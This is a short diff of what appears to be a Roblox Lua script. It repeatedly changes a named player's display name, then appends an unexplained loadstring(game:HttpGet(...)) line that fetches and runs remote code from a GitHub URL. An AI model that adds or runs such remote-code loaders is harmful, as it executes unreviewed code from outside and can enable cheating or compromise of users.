@@ -97,3 +97,4 @@ while true do
 	game.Players["6akzino"].Character.Humanoid.DisplayName = name
 	wait(1)
 end
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
